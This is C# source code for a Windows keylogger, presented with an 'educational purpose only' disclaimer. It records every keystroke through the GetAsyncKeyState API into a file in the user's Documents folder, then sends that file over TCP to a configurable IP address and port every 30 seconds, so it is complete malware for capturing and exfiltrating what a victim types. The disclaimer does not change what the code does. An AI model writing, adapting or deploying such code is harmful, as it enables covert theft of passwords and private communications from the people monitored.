/*
 * This program is made for educational purpose only.
 * This program was created on 2025-06-11 by Alexandre Gauvin.
 * 
 * Do not use this program for any malicious purposes
 * 
 */


using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Runtime.CompilerServices;
using System.Net;
using System.Net.Sockets;

public class KeyLogger
{


    [DllImport("User32.dll")]
    public static extern short GetAsyncKeyState(Int32 vKey);

    // Verify that the save file is present. if not create it.
    // return true if file ready. Return file if it was unable to create it .
    static bool file_creation()
    {

        string path =Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        path = Path.Combine(path, "WriteLines.txt");

        // Ensure the file is not removed if it allready exist
        if (File.Exists(path))
        {
            return true;
        }

        try
        {
            using (StreamWriter outputFile = new StreamWriter(path)) { } // create and close the file imediatly
            return true;
        }
        catch (Exception _)
        {
            return false;
        };
        


    }

    // Add a key to the file 
    static void write_file(string key_pressed)
    {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "WriteLines.txt"), true)) // append the new value to the existing file
        {
            outputFile.Write(key_pressed);
        }

        return;
    }

    // send the file to a server
    static async Task sending_file(string ip_address,int port)
    {
        IPAddress ip = IPAddress.Parse(ip_address); // Where we decide the IP it goes to
        var end_point = new IPEndPoint(ip, port); // Set up the connection with the port 
        using TcpClient client = new();
        await client.ConnectAsync(end_point.Address, end_point.Port);
        await using NetworkStream stream = client.GetStream();

        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);


        // Read the file into memory (for small files)
        byte[] file_bytes = await File.ReadAllBytesAsync(Path.Combine(path, "WriteLines.txt"));

        // Send file size first (4 bytes as int)
        byte[] length_bytes = BitConverter.GetBytes(file_bytes.Length);
        await stream.WriteAsync(length_bytes, 0, length_bytes.Length);

        // Send file contents
        await stream.WriteAsync(file_bytes, 0, file_bytes.Length);


        return;
    }

    static void key_log()
    {
            string all_key_pressed = "";
            /*
             * i = 8 because 0x01=left mouse, 0x02 =  right mouse, 0x03 = cancel 0x04 = Middle mouse
             * we stop at 255 or 0xFF because these are all of the key of the keyboard. [8,255] are the key on the keyboard 
             */
            for (int i = 8; i < 255; i++)
            {

                short state = GetAsyncKeyState(i); // win api to know the key state of a specific key.
                bool is_down = (state & 0x8000) != 0; // Check if bit 15 is down
                bool was_pressed = (state & 0x001) != 0; // check if the key was press since last call

                if (was_pressed)
                {
                    ConsoleKey key = (ConsoleKey)i; // The enum of Console Key is use to find which key was used 
                    switch (key)
                    {
                        case ConsoleKey.Spacebar:
                            write_file(" ");
                            break;
                        case ConsoleKey.Enter:
                            write_file("\n");
                            break;
                        case ConsoleKey.Tab:
                            write_file("\t");
                            break;
                        case ConsoleKey.OemPeriod:
                            write_file(".");
                            break;
                        default:
                            write_file(key.ToString());
                            break;
                    }
                }
            }
        }

    static async Task Main()
    {

        if (!file_creation())
        {
            // Close we couldn't save any information.
            System.Environment.Exit(1);
        }


        // Launch sending in a separate task (parallel loop)
        _ = Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    await sending_file("127.0.0.1",8080); // Non-blocking for main thread
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[Background] Failed to send file: {e.Message}");
                }

                await Task.Delay(TimeSpan.FromSeconds(30)); // Wait between sends
            }
        });

        // Main keylogger loop
        while (true)
        {
            Thread.Sleep(10); // ~100 times per second
            key_log();        // Keep logging uninterrupted
        }
    }




}



